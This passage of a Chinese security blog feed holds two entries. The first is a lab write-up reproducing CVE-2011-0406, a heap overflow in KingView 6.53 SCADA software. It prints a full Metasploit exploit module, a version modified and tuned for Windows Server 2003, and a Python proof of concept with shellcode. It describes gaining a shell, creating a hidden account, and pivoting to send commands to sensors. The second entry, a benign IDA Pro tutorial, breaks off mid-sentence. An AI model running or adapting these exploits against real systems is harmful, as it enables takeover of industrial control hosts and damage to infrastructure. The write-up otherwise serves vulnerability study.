      <link href="2019/10/15/%EF%BC%88%E5%B7%A5%E6%8E%A7%E5%90%91%EF%BC%89%E7%BB%84%E6%80%81%E7%8E%8B%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2019/10/15/%EF%BC%88%E5%B7%A5%E6%8E%A7%E5%90%91%EF%BC%89%E7%BB%84%E6%80%81%E7%8E%8B%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>​        WellinTech KingView 6.53 版本中的 HistorySvr.exe 中存在基于堆的缓冲区溢出漏洞。需要掌握远程攻击的方式借助对 TCP 端口 777 的超长请求执行任意代码，实现在 windows 操作员站上的漏洞利用。</p><a id="more"></a><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><h3 id="组态王-KingView"><a href="#组态王-KingView" class="headerlink" title="组态王 KingView"></a>组态王 KingView</h3><p>​        亚控科技是国内较早成立的自动化软件企业之一，专注于自主研发、市场营销和服务。 1995 年率先推出组态软件 KingView 系列产品，创立组态王品牌，经过近 20 年的快速发展， 目前公司的产品涵盖设备或工段级监控平台、厂级或集团级监控平台、生产实时智能平台， 产品及方案广泛应用于市政、油气、电力、矿山、物流、汽车、大型设备等行业。</p><p>​        设备或工段级监控平台即组态王 KingView 系列产品侧重于对各种设备运行状态、某个 工段或生产线运行情况的监视控制，厂级或集团级监控平台即 KingIOServer、KingSCADA、 KingHistria产品侧重于厂级或集团级生产运营情况的全面监控及管理;生产管理平台即 KingFusion 产品则侧重实现产线监控和生产管理的完美结合。</p><h2 id="CVE-2011-0406"><a href="#CVE-2011-0406" class="headerlink" title="CVE-2011-0406"></a>CVE-2011-0406</h2><p>​        CVE-2011-0406 所描述的是亚控组态软件 KingView 6.53 存在的一个缓冲区溢出漏洞, 通过反汇编逆向分析结合动态调试可以发现该漏洞的成因,并可构造攻击代码对其所在上位 机进行攻击,进而获得上位机的远程控制权限。</p><p>​        亚控组态软件 KingView 6.53 是运行在 windows 系列操作系统上的组态软件，是亚控 公司推出的一款针对中小型项目推出的用于监视与控制自动化设备和过程的 SCADA 产品, 支持连接 1000 多个厂家近 4000 种设备，支持包括主流 PLC、变频器、仪表、特殊模块、板 卡及电力、楼宇等协议。通过分析发现安装Ki䏰槖iew6.53 软件后，系统会启动 HistorySvr.exe 进程并会以系统服务形式在上位机中运行，该服务会在 TCP 的 777 端口监听接收数据，在 接收到数据后 HistorySvr.exe 程序会有 3 次拷贝操作，前两次各 0x4000 字节，最后一次 0xC 字节，共计 0x800C(32780)字节，在写入缓冲区时，对数据校验不严格导致堆缓冲区溢出 而执行任意代码。通过构造带有 shellcode 的恶意数据包向目标主机的 777 端口进行发送即 可触发该漏洞</p><p>​        HistorySvr.exe 进程循环接收业务数据(传感器上报数据)，当接收到 异常格式的业务数据后进行数据处理时没有对数据长度进行严格校验，导致异常数据会覆盖缓冲区空间，当 CPU 按照指针地址执行指令时会跳转到攻击者设计好的 shellcode地址进行执行，导致执行攻击者构造的攻击代码。在实验过程中可以利用meatasploit攻击框架工具构造攻击代码，主要攻击载荷如下:</p><pre><code class="ruby">sploit&lt; &lt; make_nops(1020)sploit&lt; &lt; &quot;\xC4\x04\x2B\x01&quot;sploit&lt; &lt; payload.encodedsploit&lt; &lt; &quot;x44&quot;* (31752-payload.encoded.length)     sploit&lt; &lt; [target.ret].pack(&#39;V&#39;)</code></pre><p>​        通过代码可看出数据包前 1020 位使用指令用来占位，接下来 4 位是我们构造的反向连接 shellcode 在内存空间中的地址，后面是加密后的shellcode 代码，然后用(31752-shellcode长度)位的 A 字符来填充补位，最后是用来覆盖 eax 寄存器的跳转地址。</p><p>​        通过缓冲区溢出漏洞可覆盖 eax 寄存器的数据，导致程序执行到 call dword ptr[eax+c] 时指针跳转到 shellcode地址进行执行，在实际测试中可以使用metasploit构造不同类型的shellcode，可以构造反向连接类型 shellcode。使用metasploit进行攻击测试的时候需要设置 3 个参数，RHOST为远程上位机IP 地址，RPORT为 HistorySvr.exe 进程监听端口，payload为攻击载荷shellcode。</p><p>​        设置好攻击目标及端口，并加载好shellcode 后可以使用 run命令进行攻击测试，攻击成功后会获得反向连接的控制权限，并可使用metasploit自带的工具meterpreter在远程机器上执行系统命令进行远程控制。</p><p>​        获得系统权限后可以该上位机为跳板对系统内其他设备进行二次渗透，可窃取系统运行数据、向传感器节点发送控制指令、使用病毒感染系统内网其他服务器，进而危害整个工控系统及基础设施安全。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a><strong>实验环境</strong></h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z76ec19gj30cn02qt8o.jpg" alt="截屏2019-10-15下午9.17.54"></p><p>​    Windows Server 2003:KingView 6.53<br>​    Kali Linux:metasploit、Python等</p><p>​    网卡：Server2003 与Kali桥接为同一网卡</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h2><h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>​        收集 CVE-2011-0406 的信息和 EXP</p><pre><code class="ruby">### $Id$##### This file is part of the Metasploit Framework and may be subject to# redistribution and commercial restrictions. Please see the Metasploit# Framework web site for more information on licensing and terms of use.# http://metasploit.com/framework/##require &#39;msf/core&#39;class Metasploit3 &lt; Msf::Exploit::Remote    Rank = GoodRanking    include Msf::Exploit::Remote::Tcp    def initialize(info=&#123;&#125;)        super(update_info(info,            &#39;Name&#39;        =&gt; &quot;Kingview 6.53 SCADA HMI HistorySvr Heap Overflow&quot;,            &#39;Description&#39; =&gt; %q&#123;                This module exploits a buffer overflow in Kingview 6.53.  By sending a specially                crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to                gain arbitrary code execution without authentication.            &#125;,            &#39;License&#39;      =&gt; MSF_LICENSE,            &#39;Version&#39;      =&gt; &quot;$Revision$&quot;,            &#39;Author&#39;      =&gt;                [                    &#39;Dillon Beresford&#39;,  #Found by Dillon                    &#39;rick2600&#39;,          #XP SP3 execution                ],            &#39;References&#39; =&gt;                [                    [&#39;CVE&#39;, &#39;2011-0406&#39;],                    [&#39;OSVDB&#39;, &#39;70366&#39;],                    [&#39;Bugtraq&#39;, &#39;45727&#39;],                    [&#39;URL&#39;, &#39;http://www.exploit-db.com/exploits/15957&#39;],                    [&#39;URL&#39;, &#39;http://www.kb.cert.org/vuls/id/180119&#39;],                    [&#39;URL&#39;, &#39;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#39;],                ],            &#39;Payload&#39;     =&gt;                &#123;                    &#39;BadChars&#39; =&gt; &quot;\x00\x0d\x0a\xff&quot;                &#125;,            &#39;Platform&#39; =&gt; &#39;win&#39;,                &#39;Targets&#39;     =&gt;                [                    [ &#39;Windows XP SP1&#39;, &#123;&#39;Ret&#39; =&gt; 0x77ED73B4&#125; ], #UnhandledExceptionFilter() in kernel32.dll                    [ &#39;Windows XP SP3 EN&#39;, &#123;&#39;Ret&#39; =&gt; 0x00A1FB84&#125; ],                ],            &#39;DisclosureDate&#39; =&gt; &quot;9/28/2010&quot;,            &#39;DefaultTarget&#39; =&gt; 0))            register_options( [ Opt::RPORT(777) ], self.class )    end    def exploit        sploit = &#39;&#39;        if target.name =~ /XP SP1/            sploit &lt;&lt; make_nops(32812)            sploit &lt;&lt; &quot;\xEB\x10&quot;            sploit &lt;&lt; &quot;\x41&quot;*6            sploit &lt;&lt; &quot;\xAD\xBB\xC3\x77&quot;            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)            sploit &lt;&lt; make_nops(8)            sploit &lt;&lt; payload.encoded            sploit &lt;&lt; &quot;\x44&quot;*(1000-payload.encoded.length)            #this makes the app more crashy, need to investigatev            #sploit &lt;&lt; make_nops(1000-payload.encoded.length)         elsif target.name =~ /XP SP3/            sploit &lt;&lt; make_nops(1024)            sploit &lt;&lt; payload.encoded            sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)            #rand_text_alpha_xxx() unfortunately makes it a bit unstable,            #not ready to implement            #sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)        end        connect        print_status(&quot;Trying target #&#123;target.name&#125;&quot;)        sock.write(sploit)        select(nil, nil, nil, 5)        handler        disconnect    endend</code></pre><p>​        将 rb 脚本存放至 metasploit的相应安装目录中进行调用。 例如:/exploits/windows/scada</p><p>​        开启 KingView6.53 打开软件预制 Kingdemo 工程。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7csvgf1j31h70tb1kx.jpg" alt="截屏2019-10-15下午9.24.03"></p><p>​        确认目标及其 777 端口已经开放，并且防火墙是关闭状态。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7eecdghj30jm0awgor.jpg" alt="截屏2019-10-15下午3.47.16"></p><h3 id="攻击尝试"><a href="#攻击尝试" class="headerlink" title="攻击尝试"></a>攻击尝试</h3><p>​        开启 Kali 安全测试主机作为攻击测试主机，确认msf框架 exploit 攻击代码录入并保存在/usr/share/metasploit-framework/modules/expolits/windows/scada 目录下。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7hwlsxij312h0iljtt.jpg" alt="截屏2019-10-15下午9.29.02"></p><p>​        启动metasploit，加载kingview模块</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7jk1c1sj30p20icwp4.jpg" alt="截屏2019-10-15下午4.53.55"></p><p>​        查看攻击靶机ip地址，置入 RHOST 参数中。进行攻击尝试。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7k7ok7cj30p20ich4a.jpg" alt="截屏2019-10-15下午5.21.34"></p><p>​        由于攻击代码中并没有包含 windows Server 2003 版本，因此攻击未成功。</p><h3 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h3><p>​        我们可以看到目标靶机中的kingview服务已经停止，并且异常调试工具已经启动。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7lxgfzcj30m80htgoe.jpg" alt="截屏2019-10-15下午5.39.21"></p><p>​        这表明 HistorySvr.exe 程序中的漏洞已经被触发且产生影响，只是 shellcode 并未在目标靶机中运行，程序执行未跳转到指定 shellcode 位置。</p><p>​        通过查看 OllyDbg 中 view—&gt;log，可以看到程序终止在地址为 0x77F47530，异常原因 为 Access violation when reading [00B5084D]。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7onss9gj31g30suju7.jpg" alt="截屏2019-10-15下午6.58.20"></p><p>​        观察程序发生异常时执行代码为mov cl, byte ptr  [eax + 5]，即程序将执行该指针位置处的指令，然而该地址值为 0x00B5084D，并未获取到可执行指令。</p><p>​        利用代码针对目标为“windows XP SP3 EN”系统的返回地址 Ret 为异常时 EAX 寄存器 的值 0x00B50848。</p><h3 id="修改利用代码"><a href="#修改利用代码" class="headerlink" title="修改利用代码"></a>修改利用代码</h3><p>​        重新打开漏洞利用代码进行编辑，targets 中加入“windows 2003 SP0 EN”，target.name 加入“2003 SP0”，Ret 值暂时随意填写，exploit 函数构造溢出包时，加入定位字符“ABCA” 便于我们定位 payload 地址位置，具体代码如下所示。</p><pre><code class="ruby">require &#39;msf/core&#39;class Metasploit3 &lt; Msf::Exploit::Remote    Rank = GoodRanking    include Msf::Exploit::Remote::Tcp    def initialize(info=&#123;&#125;)        super(update_info(info,            &#39;Name&#39;        =&gt; &quot;Kingview 6.53 SCADA HMI HistorySvr Heap Overflow&quot;,            &#39;Description&#39; =&gt; %q&#123;                This module exploits a buffer overflow in Kingview 6.53.  By sending a specially                crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to                gain arbitrary code execution without authentication.            &#125;,            &#39;License&#39;      =&gt; MSF_LICENSE,            &#39;Version&#39;      =&gt; &quot;$Revision$&quot;,            &#39;Author&#39;      =&gt;                [                    &#39;Dillon Beresford&#39;,  #Found by Dillon                    &#39;rick2600&#39;,          #XP SP3 execution                ],            &#39;References&#39; =&gt;                [                    [&#39;CVE&#39;, &#39;2011-0406&#39;],                    [&#39;OSVDB&#39;, &#39;70366&#39;],                    [&#39;Bugtraq&#39;, &#39;45727&#39;],                    [&#39;URL&#39;, &#39;http://www.exploit-db.com/exploits/15957&#39;],                    [&#39;URL&#39;, &#39;http://www.kb.cert.org/vuls/id/180119&#39;],                    [&#39;URL&#39;, &#39;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#39;],                ],            &#39;Payload&#39;     =&gt;                &#123;                    &#39;BadChars&#39; =&gt; &quot;\x00\x0d\x0a\xff&quot;                &#125;,            &#39;Platform&#39; =&gt; &#39;win&#39;,                &#39;Targets&#39;     =&gt;                [                    [ &#39;Windows XP SP1&#39;, &#123;&#39;Ret&#39; =&gt; 0x77ED73B4&#125; ], #UnhandledExceptionFilter() in kernel32.dll                    [ &#39;Windows XP SP3 EN&#39;, &#123;&#39;Ret&#39; =&gt; 0x00A1FB84&#125; ],                    [ &#39;Windows 2003 SP0 EN&#39;, &#123;&#39;Ret&#39; =&gt; 0x00B50848&#125; ],#newtarget                ],            &#39;DisclosureDate&#39; =&gt; &quot;9/28/2010&quot;,            &#39;DefaultTarget&#39; =&gt; 0))            register_options( [ Opt::RPORT(777) ], self.class )    end    def exploit        sploit = &#39;&#39;        if target.name =~ /XP SP1/            sploit &lt;&lt; make_nops(32812)            sploit &lt;&lt; &quot;\xEB\x10&quot;            sploit &lt;&lt; &quot;\x41&quot;*6            sploit &lt;&lt; &quot;\xAD\xBB\xC3\x77&quot;            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)            sploit &lt;&lt; make_nops(8)            sploit &lt;&lt; payload.encoded            sploit &lt;&lt; &quot;\x44&quot;*(1000-payload.encoded.length)            #this makes the app more crashy, need to investigatev            #sploit &lt;&lt; make_nops(1000-payload.encoded.length)         elsif target.name =~ /XP SP3/            sploit &lt;&lt; make_nops(1024)            sploit &lt;&lt; payload.encoded            sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)            #rand_text_alpha_xxx() unfortunately makes it a bit unstable,            #not ready to implement            #sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)        elsif target.name =~ /2003 SP0/            sploit &lt;&lt; make_nops(1020)            sploit &lt;&lt; &quot;ABCA&quot;            sploit &lt;&lt; payload.encoded            sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)        end        connect        print_status(&quot;Trying target #&#123;target.name&#125;&quot;)        sock.write(sploit)        select(nil, nil, nil, 5)        handler        disconnect    endend</code></pre><p>​        进入msf，重新 reaload module，可以看到新加入的目标代码已经加载。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z80ro7apj31g30sue82.jpg" alt="截屏2019-10-15下午7.06.12"></p><p>​        这里注意，一定要更换攻击方式，由原来的1变为2.</p><pre><code class="ruby">    set target 2</code></pre><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z82ue9dhj31g30suqv5.jpg" alt="截屏2019-10-15下午8.04.47"></p><p>​        再次攻击后，在memory中查找定位字符串位置 ABCA，如下图所示。（图中为我第一次设置的标志值ABCD，方法相同）</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z846kebnj31g30suwht.jpg" alt="截屏2019-10-15下午7.29.11"></p><p>​        可以看到“ABCA”字符串在地址 0x00CD04C0 位置，并且䏰ᰡyload需要在此基础上加4个字节，其实位置在 0x00CD04C4。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z8551rqjj31g30su0w1.jpg" alt="截屏2019-10-15下午8.08.37"></p><p>​        需根据上步骤定位出的 shellcode 位置来调整 Ret 的值，使得 eax + 0xC 指向输入数据包中的某个 4 字节数据。定位字符“ABCA”位 置是 0x00CD04C0，减去 0xC 得到 eax 寄存器的值为 0x00CD04C4，所以 Ret 的值为 0x00CD04C4。修改后的利用程序代码如下所示:</p><pre><code class="ruby">elsif target.name =~ /2003 SP0/        sploit &lt;&lt; make_nops(1020)        sploit &lt;&lt; &quot;\xC4\x04\xB4\x00&quot;        sploit &lt;&lt; payload.encoded        sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)        sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)end</code></pre><p>​        再次利用可成功通过漏洞获取系统权限。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z89ajgtjj31g30su4qq.jpg" alt="截屏2019-10-15下午8.31.37"></p><h2 id="预期结果"><a href="#预期结果" class="headerlink" title="预期结果"></a><strong>预期结果</strong></h2><p>​        成功获取win 2003 操作员站的shell，并可以在操作员站建立隐蔽账号。</p><h2 id="PLUS"><a href="#PLUS" class="headerlink" title="PLUS"></a>PLUS</h2><p>​        尝试通过Python脚本的方式进行 EXP 编写进行手工测试。</p><p>​        下面给出一个参考：</p><pre><code class="python">## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC## Date: 9/28/2010## Author: Dillon Beresford## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar## Version: 6.53 (English)## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. ## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.## Thanks to all who share knowledge about heap smashing and heap bypass techniques.## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.## No patch or response from vendor as of 1/9/2011## Lets get this into the wild and see how long it takes them to respond.## Looks like persistence pays off. :-)## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).## Vendor: Beijing WellinControl Technology Development Co.,Ltd ## http://www.wellintek.com## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM## I have made every attempt and yet they choose to ignore...## This PoC should wake up the dragon. &gt;:-]## With more to come!## KingView software is a high-pormance production which can be used to building a data information ## service platform in automatic field. KingView software can provid graphic visualization which takes ## your operations management, control and optimization . KingView is widely used in power, ## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. ## And now KingView software is used in national defense, Aero-Space in China. ## Notes: The HistorySrv process listens on TCP port 777 ## This process does not require any authentication from clients## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. ## Windows XP SP1 (x86) ## CommandLine: &quot;C:\Program Files\Kingview\HistorySvr.exe&quot;## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202## ntdll!DbgBreakPoint:## 77f767cd cc              int     3## 0:000&gt; g## ModLoad: 71950000 71a34000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\comctl32.dll## ModLoad: 5ad70000 5ada4000   C:\WINDOWS\System32\uxtheme.dll## ModLoad: 71a50000 71a8b000   C:\WINDOWS\system32\mswsock.dll## ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll## (318.6d4): Access violation - code c0000005 (first chance)## First chance exceptions are reported before any exception handling.## This exception may be expected and handled.## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246## ntdll!RtlAllocateHeapSlowly+0x6bd:## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????## 0:000&gt; u## ntdll!RtlAllocateHeapSlowly+0x6bd:## 77f6256f 8901            mov     dword ptr [ecx],eax## 77f62571 894804          mov     dword ptr [eax+4],ecx## 77f62574 3bc1            cmp     eax,ecx## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)## 77f62578 668b06          mov     ax,word ptr [esi]## 77f6257b 663d8000        cmp     ax,80h## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)## 77f62581 0fb7c8          movzx   ecx,ax## usage python exploit.py 127.0.0.1 777import osimport socketimport syshost = sys.argv[1]port = int(sys.argv[2])print &quot; KingView 6.53 SCADA HMI Heap Smashing Exploit &quot;print &quot; Credits: D1N | twitter.com/D1N &quot;shellcode = (&quot;\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9&quot;&quot;\x44\x80\xc2\x77&quot; &quot;\xFF\xD1\x90\x90&quot;) exploit = (&quot;\x90&quot; * 1024 + &quot;\x44&quot; * 31788) exploit += (&quot;\xeb\x14&quot;) # our JMP (over the junk and into nops) exploit += (&quot;\x44&quot; * 6) exploit += (&quot;\xad\xbb\xc3\x77&quot;) # ECX 0x77C3BBAD --&gt; call dword ptr ds:[EDI+74] exploit += (&quot;\xb4\x73\xed\x77&quot;) # EAX 0x77ED73B4 --&gt; UnhandledExceptionFilter() exploit += (&quot;\x90&quot; * 21) exploit += shellcodeprint &quot;  [+] Herrow Sweeping Dragon...&quot;print &quot;  [+] Sending payload...&quot;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  s.connect((host,port)) s.send(exploit)  data = s.recv(1024)print &quot;  [+] Closing connection..&quot; s.close()  print &quot;  [+] Done!&quot; </code></pre>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA总结使用与简单实践</title>
      <link href="2019/09/19/IDA/"/>
      <url>2019/09/19/IDA/</url>
      
        <content type="html"><![CDATA[<h3 id="IDA核心功能介绍"><a href="#IDA核心功能介绍" class="headerlink" title="IDA核心功能介绍"></a>IDA核心功能介绍</h3><p>IDA Pro（简称IDA）是DataRescue公司出品的一款可编程的交互式反汇编工具和调试器，它的最主要的特性是交互和多处理器。操作者可以通过对IDA的交互来指导IDA更好地反汇编，IDA并非自动解决程序中的问题，但它会按用户的指令找到可疑之处，用户的工作是通知IDA怎样去做。比如人工指定编译器类型，对变量名、结构定义、数组等定义等。这样的交互能力在反汇编大型软件时显得尤为重要。多处理器特点是指IDA支持常见处理器平台上的软件产品，IDA支持的文件类型非常丰富，除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台的文件格式。</p><a id="more"></a><p>IDA Pro首先是一个反汇编器，可以显示二进制汇编代码（可执行文件或DLL动态链接库），它提供的高级功能帮助我们更加容易的理解汇编代码。其次，它又是一个调试器，用户可以逐条调试二进制文件中的指令，从而确定当前正在执行的哪条指令，以及执行的顺序等。</p><p>IDA Pro提供了许多强大功能，例如函数的交叉引用查看、函数执行流程图及伪代码等，并且也有一定的动态调试功能。同时，IDA pro可以在windows、linux、ios下进行二进制程序的动态调试和动态附加，支持查看程序运行内存空间，设置内存断点和硬件断点。</p><p>IDA无疑是当今最强大的反汇编软件，虽然目前IDA支持简单的动态调试，但是大多数情况下我们主要使用其强大的反汇编功能。</p><h3 id="IDA加载自编译HelloWorld程序"><a href="#IDA加载自编译HelloWorld程序" class="headerlink" title="IDA加载自编译HelloWorld程序"></a>IDA加载自编译HelloWorld程序</h3><p>我们使用visual c++编写一个简单的helloworld，在编译、链接后形成一个二进制程序，程序如下所示：</p><pre><code class="c++">#include &lt;iostream.h&gt;int main()&#123;    cout&lt;&lt;&quot;Hello,World!&quot;&lt;&lt;endl;    cin.get();    return 0;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753ldo622j31ex0oawif.jpg" alt="img"></p><p>将该程序放入IDA Pro中进行静态反汇编</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753m24s3rj31100o042c.jpg" alt="img"> </p><p>可以看到使用IDA反汇编程序时，IDA会自动停在main()函数入口处，下面的程序主体也都列了出来，Helloworld程序加载成功。</p><h3 id="IDA分析真实程序"><a href="#IDA分析真实程序" class="headerlink" title="IDA分析真实程序"></a>IDA分析真实程序</h3><p>我们以windows中自带的扫雷为例，来对IDA pro进行简单的使用介绍。将桌面Winmine.exe文件拖入IDA后界面如下图所示：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753n6x4zbj316m0po7gy.jpg"></p><p>我们看到在程序加载完全后整体页面分为几个大部分，对其标号后分别对其功能进行介绍。</p><p>第一部分表示的是IDA概况导航栏，它是被加载文件地址空间的线性视图。如图中所示它对扫雷程序内不同代码块使用不同的颜色进行区分，我们可以直接点击相应的颜色块进行不同代码块的直接定位。默认情况下，我们定义颜色的意义为：</p><p>蓝色：表示代码段。</p><p>棕色：表示数据段。</p><p>红色：表示内核。</p><p>第二部分表示该扫雷程序的函数表，双击任一后反汇编窗口会跳转到选定函数的所在位置，进而查看详细信息，如图中选中了start开始函数。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753ovpysqj30l40d00ug.jpg" alt="img"> </p><p>第三部分对应的就是整体扫雷程序结构的图形概况形式，可以大体把握功能和结构的走向，它对整体的脱壳逆向有很大的帮助。事实上这一部分是图形视图的一个缩小快照，因为主显示区很少能够一次显示某个函数的完整图形，下图中的虚线矩形就表示其在图形视图中的当前显示位置。在图形概况窗口内点击鼠标，可重新定位图形视图的显示位置。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753ozuhbbj30960aamxb.jpg" alt="img"> </p><p>第四部分是IDA的主视图，常用的又可以分为以下几部分信息：</p><p>（1）IDA View-A</p><p>IDA View-A表示的就是该扫雷程序的图标架构，可以查看程序的逻辑树形图，把程序的结构更人性化地显示出来，方便我们的分析。它显示出一个函数内部的执行流程。在反汇编界面中按空格键就可以在汇编代码和图形显示之间进行切换。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753p3m9aoj30lx09rgq7.jpg" alt="img"> </p><p>（2）Hex View-1</p><p>在Hex View-1中可以查看扫雷的16进制代码，方便定位代码后使用其他工具进行进一步的修改操作。默认情况下，Hex View窗口会与IDA View窗口同步，即在一个窗口中滚动鼠标，另一个窗口中也会滚动到相应的位置，此外在IDA View中选中一个项目，Hex View中的对应字节也会突出。具体表示如下图所示：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753p7fnh9j30zk0l0agc.jpg" alt="img"> </p><p>（3）Structures</p><p>在Stuuctures中可以查看到扫雷程序的结构体，它用于显示IDA决定在一个二进制文件中使用的任何复杂的数据结构的布局。</p><p>（4）Enums</p><p>在Enums中可以查看枚举信息</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753pcqi1fj30n209tdjs.jpg" alt="img"> </p><p>（5）Imports</p><p>在Imports中可以查看到输入函数，导入表即程序中调用到的外面的函数。</p><p>（6）Exports</p><p>在Exports中可以查看到输出函数。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753phmpfsj30n2067mz2.jpg" alt="img"> </p><h3 id="IDA分析结果导出"><a href="#IDA分析结果导出" class="headerlink" title="IDA分析结果导出"></a>IDA分析结果导出</h3><p>当使用IDA分析软件时，事实上它会创建一个数据库，其组件分别保存在4个文件中，这些文件的名称与选定的可执行文件名称相同，拓展名分别为id0、id1、nam与til。</p><p>id0：它是一个二叉树形式的数据库</p><p>id1：程序字节标识，包含描述每个程序字节的标记</p><p>nam：Named窗口中显示的给定程序位置有关的索引信息</p><p>til：用于存储给定数据库的本地类型定义的相关信息</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753pnray1j30qa040q40.jpg" alt="img"> </p><p>当你关闭一次分析想要保存时，或者切换到另一个数据库，IDA都将会显示一个Save database对话框，在它之中有如下几个选项：</p><p>Don’t pack database（不打包数据库），这个选项仅仅刷新对 4 个数据库组件文件所做的更改，在关闭桌面前并不创建 IDB 文件</p><p>Pack database（Store）［打包数据库（存储）］，选择该选项会将 4 个数据库组件文件存到一个 IDB 文件中，然后这 4 个数据库文件会被删除，Store 选项不使用压缩</p><p>Pack database（Deflate）［打包数据库（压缩）］，Deflate 选项等同于 Store 选项，其唯一的差别在于数据库组件文件被压缩到 IDB 归档文件中</p><p>Collect garbage（收集垃圾），如果勾选该选项，IDA 会在关闭数据库之前，从数据库中删除任何没有用的内存页面，在选择这个选项的同时，选择Deflate选项可创建尽可能小的 IDB文件。通常，只有在磁盘空间不足时才选择这个选项</p><p>DON’T SAVE the datebase（不保存数据库），选择这个选项时，IDA 会删除 4 个数据库组件文件，保留现有的未经修改的 IDB 文件。使用这个选项类似于在使用IDA 时应用了撤销或还原功能</p><h3 id="IDA插件使用"><a href="#IDA插件使用" class="headerlink" title="IDA插件使用"></a>IDA插件使用</h3><p>IDA作为一款强大的静态反汇编工具，它的插件可以让其功能得到进一步加强。下面介绍几个常用的IDA Pro插件：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753prxw5vj30k20gq763.jpg" alt="img"> </p><p>1.　Hex-Rays 反编译插件</p><p>Hex-Rays 反编译插件可以将汇编代码反编译成伪C/C++代码，便于用户阅读，提高反汇编的效率。目前Hex-Rays反编译插件只能在32位平台上运行，可以反编译Intel x86、Intel 